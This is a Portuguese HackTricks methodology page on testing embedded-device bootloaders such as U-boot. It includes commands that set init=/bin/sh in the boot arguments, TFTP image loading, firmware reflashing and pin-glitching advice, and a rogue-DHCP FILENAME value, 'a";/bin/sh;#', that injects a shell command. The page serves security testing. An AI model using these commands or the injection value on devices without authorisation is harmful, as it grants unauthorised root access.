<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** repositórios [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

As seguintes etapas são recomendadas para modificar as configurações de inicialização do dispositivo e bootloaders como o U-boot:

1. **Acesse o Shell do Interpretador do Bootloader**:
- Durante a inicialização, pressione "0", espaço ou outros "códigos mágicos" identificados para acessar o shell do interpretador do bootloader.

2. **Modifique os Argumentos de Inicialização**:
- Execute os seguintes comandos para adicionar '`init=/bin/sh`' aos argumentos de inicialização, permitindo a execução de um comando shell:
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **Configure um Servidor TFTP**:
- Configure um servidor TFTP para carregar imagens em uma rede local:
%%%
#setenv ipaddr 192.168.2.2 #IP local do dispositivo
#setenv serverip 192.168.2.1 #IP do servidor TFTP
#saveenv
#reset
#ping 192.168.2.1 #verifique o acesso à rede
#tftp ${loadaddr} uImage-3.6.35 #loadaddr recebe o endereço para carregar o arquivo e o nome do arquivo da imagem no servidor TFTP
%%%

4. **Utilize `ubootwrite.py`**:
- Use `ubootwrite.py` para escrever a imagem do U-boot e enviar um firmware modificado para obter acesso root.

5. **Verifique Recursos de Depuração**:
- Verifique se recursos de depuração como registro verbose, carregamento de kernels arbitrários ou inicialização de fontes não confiáveis estão habilitados.

6. **Interferência de Hardware com Cautela**:
- Tenha cuidado ao conectar um pino à terra e interagir com chips de flash SPI ou NAND durante a sequência de inicialização do dispositivo, especialmente antes da descompressão do kernel. Consulte o datasheet do chip de flash NAND antes de curto-circuitar os pinos.

7. **Configure um Servidor DHCP Falso**:
- Configure um servidor DHCP falso com parâmetros maliciosos para um dispositivo ingerir durante uma inicialização PXE. Utilize ferramentas como o servidor auxiliar DHCP do Metasploit (MSF). Modifique o parâmetro 'FILENAME' com comandos de injeção de comando como `'a";/bin/sh;#'` para testar a validação de entrada nos procedimentos de inicialização do dispositivo.

**Nota**: As etapas envolvendo interação física com os pinos do dispositivo (*marcadas com asteriscos) devem ser abordadas com extrema cautela para evitar danificar o dispositivo.


## Referências
* [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
